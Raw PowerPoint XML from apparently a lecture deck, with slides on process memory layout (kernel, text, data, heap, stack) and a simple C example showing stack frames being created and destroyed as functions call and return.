              <a:gd name="connsiteX2" fmla="*/ 3057761 w 3057761"/>
              <a:gd name="connsiteY2" fmla="*/ 596934 h 1718872"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0" y="connsiteY0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1" y="connsiteY1"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2" y="connsiteY2"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3057761" h="1718872">
                <a:moveTo>
                  <a:pt x="0" y="1718872"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="663748" y="967831"/>
                  <a:pt x="1327496" y="216790"/>
                  <a:pt x="1837123" y="29800"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="2346750" y="-157190"/>
                  <a:pt x="3057761" y="596934"/>
                  <a:pt x="3057761" y="596934"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:ln>
            <a:tailEnd type="triangle" w="lg" len="lg"/>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4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>11</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="108235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Memory Organization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text Box 11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2494073" y="1378182"/>
            <a:ext cx="1842654"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kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Lower </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0" err="1">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Mem</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0" err="1">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Addr</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0">
              <a:latin typeface="Times New Roman" charset="0"/>
              <a:ea typeface="新細明體" charset="0"/>
              <a:cs typeface="新細明體" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Line 15"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3402483" y="4500263"/>
            <a:ext cx="0" cy="26693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1" name="Line 16"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="3402483" y="5382193"/>
            <a:ext cx="0" cy="25505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 name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5371273" y="2550644"/>
            <a:ext cx="2193496"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kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Text:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>	Instructions </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>	Read-only</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5371274" y="3490258"/>
            <a:ext cx="2193497" cy="58477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kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Data: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>	Static variables</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-TW" altLang="en-US" sz="1600" dirty="0">
              <a:latin typeface="Times New Roman" charset="0"/>
              <a:ea typeface="新細明體" charset="0"/>
              <a:cs typeface="新細明體" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5371275" y="4202371"/>
            <a:ext cx="2193496"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kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Stack: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>	Local variables</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>	Return address</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-TW" altLang="en-US" sz="1600" dirty="0">
              <a:latin typeface="Times New Roman" charset="0"/>
              <a:ea typeface="新細明體" charset="0"/>
              <a:cs typeface="新細明體" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="7" name="Group 6"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2259483" y="1865232"/>
            <a:ext cx="2286000" cy="4188845"/>
            <a:chOff x="2658868" y="1690487"/>
            <a:chExt cx="2286000" cy="4188845"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="4" name="Rectangle 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2658868" y="2428336"/>
              <a:ext cx="2286000" cy="726525"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent6">
                <a:lumMod val="60000"/>
                <a:lumOff val="40000"/>
              </a:schemeClr>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>Text</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="Rectangle 9"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2658868" y="3154862"/>
              <a:ext cx="2286000" cy="787069"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="tx2">
                <a:lumMod val="60000"/>
                <a:lumOff val="40000"/>
              </a:schemeClr>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2400" dirty="0">
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>Data</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Rectangle 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2658868" y="3941931"/>
              <a:ext cx="2286000" cy="193740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sz="2400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="accent2"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>Heap</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="accent2"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>Stack</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="19" name="Rectangle 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2658868" y="1690487"/>
              <a:ext cx="2286000" cy="72652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kumimoji="1" lang="en-US" altLang="zh-TW" sz="2400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>OS Kernel</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text Box 11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2448549" y="6159374"/>
            <a:ext cx="1947248"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kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Higher </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0" err="1">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Mem</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0" err="1">
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:rPr>
              <a:t>Addr</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" dirty="0">
              <a:latin typeface="Times New Roman" charset="0"/>
              <a:ea typeface="新細明體" charset="0"/>
              <a:cs typeface="新細明體" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="12" name="Group 11"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="810107" y="2605644"/>
            <a:ext cx="1449375" cy="3428743"/>
            <a:chOff x="1209492" y="2450589"/>
            <a:chExt cx="1449375" cy="3428743"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Text Box 13"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1209492" y="3946693"/>
              <a:ext cx="966931"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kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000" dirty="0">
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>Process</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="3" name="Left Brace 2"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2123524" y="2450589"/>
              <a:ext cx="535343" cy="342874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5" name="Rounded Rectangular Callout 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4722268" y="5382193"/>
            <a:ext cx="4315388" cy="1146513"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRoundRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -27976"/>
              <a:gd name="adj2" fmla="val -9380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600" dirty="0"/>
              <a:t>Each function is corresponding to one stack frame</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Called: the stack frame is assigned</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Returned: the stack frame is destroyed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Slide Number Placeholder 16"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="59499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t>Stack: A high-level Overview</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1435100"/>
            <a:ext cx="3008313" cy="5259541"/>
          </a:xfrm>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>void D(){</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>	// do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>sth</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>void C(){</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>	//do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>sth</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>void B(){</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>	C();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>	D();</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>void A(){</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>	B();</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>void main()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>	A();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920838" y="1504135"/>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A’s Stack Frame</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="24" name="Straight Arrow Connector 23"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5560686" y="1676742"/>
            <a:ext cx="493188"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a:off x="5560686" y="2021953"/>
            <a:ext cx="645588" cy="517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5560686" y="3555201"/>
            <a:ext cx="493188"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a:off x="5560686" y="4393572"/>
            <a:ext cx="781214" cy="4887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5634666" y="5811406"/>
            <a:ext cx="493188"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38956" y="924569"/>
            <a:ext cx="1830700" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>when A() is called</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920838" y="2021953"/>
            <a:ext cx="1516551" cy="27123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t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="39" name="Group 38"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6341900" y="917282"/>
            <a:ext cx="1516551" cy="1306875"/>
            <a:chOff x="6341900" y="917282"/>
            <a:chExt cx="1516551" cy="1306875"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6341900" y="1435100"/>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A’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="Rectangle 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6341900" y="917282"/>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B’s Stack Frame</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="33" name="Rectangle 32"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6341900" y="1952918"/>
              <a:ext cx="1516551" cy="27123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t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="40" name="Group 39"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3945498" y="2692169"/>
            <a:ext cx="1516551" cy="1824693"/>
